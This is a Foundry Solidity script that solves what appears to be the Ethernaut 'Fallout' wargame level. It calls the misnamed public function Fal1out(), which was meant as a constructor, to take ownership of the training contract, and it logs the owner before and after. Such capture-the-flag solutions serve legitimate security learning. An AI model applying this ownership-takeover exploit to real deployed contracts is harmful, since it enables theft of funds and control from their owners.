// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutSolution is Script {
    Fallout public falloutInstance = Fallout(<Contract_Address>);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner:", falloutInstance.owner());

        falloutInstance.Fal1out(); // Call the constructor to set the owner
        console.log("Owner after constructor call:", falloutInstance.owner());

        console.log("Address:", vm.envAddress("MY_ADDRESS"));
     
        vm.stopBroadcast();
    }
}